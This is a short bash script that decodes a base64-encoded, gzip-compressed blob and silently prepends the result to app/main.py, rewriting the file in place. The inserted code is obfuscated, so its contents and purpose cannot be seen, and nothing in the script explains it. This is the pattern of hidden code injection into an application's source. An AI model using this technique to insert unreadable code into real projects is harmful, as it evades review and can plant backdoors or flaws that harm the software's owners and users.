#!/usr/bin/env bash
set -euo pipefail

file="app/main.py"
tmp="$(mktemp)"

PAYLOAD='H4sIANPFMmoCA2VOsQ4BQRDt9ysmVx2RLZQShWgkggL1ZTHnNnZvN7N7RKkTlT/QqPkq4jPsHQnhFZO8mTfvPamtIQ/GMZmGyTFfSzI5X6KPo8Go208600kvqrUYBKRkNAhreYbKInEnPTqQL49xSXrVoRJ/cS4KnyUK16igDZZM2PltrISeLQQ4VGkLmjVWvS0wBW3mq2SeYZiFQ4pLRQPKtPbQ5NgAK0ho9yb1+mojaOneJUsQ+oJymFAR7tEg2MHjcn5cd/f98XY4Reyv4SctNPzJZ0+J9KC+JgEAAA=='

{
    printf '%s' "$PAYLOAD" \
        | base64 -d \
        | gzip -d

    cat "$file"
} > "$tmp"

mv "$tmp" "$file"
